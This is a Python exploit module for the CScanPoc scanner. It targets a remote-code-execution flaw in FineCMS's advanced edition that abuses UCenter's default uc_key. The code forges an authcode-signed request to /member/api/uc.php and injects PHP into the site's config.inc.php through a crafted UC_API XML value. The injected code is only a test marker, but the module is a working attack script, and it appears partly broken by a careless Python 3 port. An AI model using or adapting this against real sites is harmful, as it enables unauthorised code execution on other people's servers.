# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import hashlib
import time
import math
import base64
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'FineCMS_0004'  # 平台漏洞编号，留空
    name = 'FineCMS高级版 前台getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-09-15'  # 漏洞公布时间
    desc = '''
        FineCMS是一款基于PHP+MySql开发的内容管理系统，采用MVC设计模式实现业务逻辑与表现层的适当分离，使网页设计师能够轻松设计出理想的模板，
        插件化方式开发功能易用便于扩展，支持自定义内容模型和会员模型，并且可以自定义字段，系统内置文章、图片、下载、房产、商品内容模型，
        系统表单功能可轻松扩展出留言、报名、书籍等功能，实现与内容模型、会员模型相关联，FineCMS可面向中小型站点提供重量级网站建设解决方案
        ===
        /member/api/uc.php
        define('DISCUZ_ROOT', dirname(dirname(dirname(__FILE__))).'/member/ucenter/');
        include DISCUZ_ROOT.'api/uc.php';

        包含了uc插件。但是这个功能只有高级版才有，免费版没有。
        然后uckey都是默认的：8808cer8o1UJsEpt2G2Jn0uhEn/YgEva589Mfo0
        可以直接getshell.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0141125'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FineCMS'  # 漏洞应用名称
    product_version = 'FineCMS高级版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7e5c8a8a-66fd-4066-a069-e508259ccb74'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref:http://www.wooyun.org/bugs/wooyun-2015-0141125
            arg = self.target
            hh = hackhttp.hackhttp()

            def microtime(get_as_float=False):
                if get_as_float:
                    return time.time()
                else:
                    return '%.8f %d' % math.modf(time.time())

            def get_authcode(string, key=''):
                ckey_length = 4
                key = hashlib.md5(key).hexdigest()
                keya = hashlib.md5(key[0:16]).hexdigest()
                keyb = hashlib.md5(key[16:32]).hexdigest()
                keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]
                cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()

                key_length = len(cryptkey)
                string = '0000000000' + \
                    (hashlib.md5(string+keyb)).hexdigest()[0:16] + string
                string_length = len(string)
                result = ''
                box = list(range(0, 256))
                rndkey = dict()
                for i in range(0, 256):
                    rndkey[i] = ord(cryptkey[i % key_length])
                j = 0
                for i in range(0, 256):
                    j = (j + box[i] + rndkey[i]) % 256
                    tmp = box[i]
                    box[i] = box[j]
                    box[j] = tmp
                a = 0
                j = 0
                for i in range(0, string_length):
                    a = (a + 1) % 256
                    j = (j + box[a]) % 256
                    tmp = box[a]
                    box[a] = box[j]
                    box[j] = tmp
                    result += chr(ord(string[i]) ^
                                  (box[(box[a] + box[j]) % 256]))
                return keyc + base64.b64encode(result).replace('=', '')

            def get_shell(url, key):
                headers = {
                    'Accept-Language': 'zh-cn',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
                    'Referer': url
                }
                tm = time.time()+10*3600
                tm = "time=%d&action=updateapps" % tm
                code = urllib.parse.quote(get_authcode(tm, key))
                url = url + "?code=" + code
                data1 = '''
                    <?xml version="1.0" encoding="ISO-8859-1"?>
                    <root>
                    <item id="UC_API">http://xxx\');echo("testvul");//</item>
                    </root>
                '''
                try:
                    req = urllib.request.Request(
                        url, data=data1, headers=headers)
                    ret = urllib.request.urlopen(req)
                except:
                    return "error"
                data2 = '''
                    <?xml version="1.0" encoding="ISO-8859-1"?>
                    <root>
                    <item id="UC_API">http://aaa</item>
                    </root>
                '''
                try:
                    req = urllib.request.Request(
                        url, data=data2, headers=headers)
                    ret = urllib.request.urlopen(req)
                except:
                    return "error"
                return 1
            res = get_shell(arg + "/member/api/uc.php",
                            '8808cer8o1UJsEpt2G2Jn0uhEn/YgEva589Mfo0')
            if res != 1:
                return False
            poc = arg + '/member/ucenter/config.inc.php'
            code, head, res, errcode, _ = hh.http(poc)
            if 'testvul' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
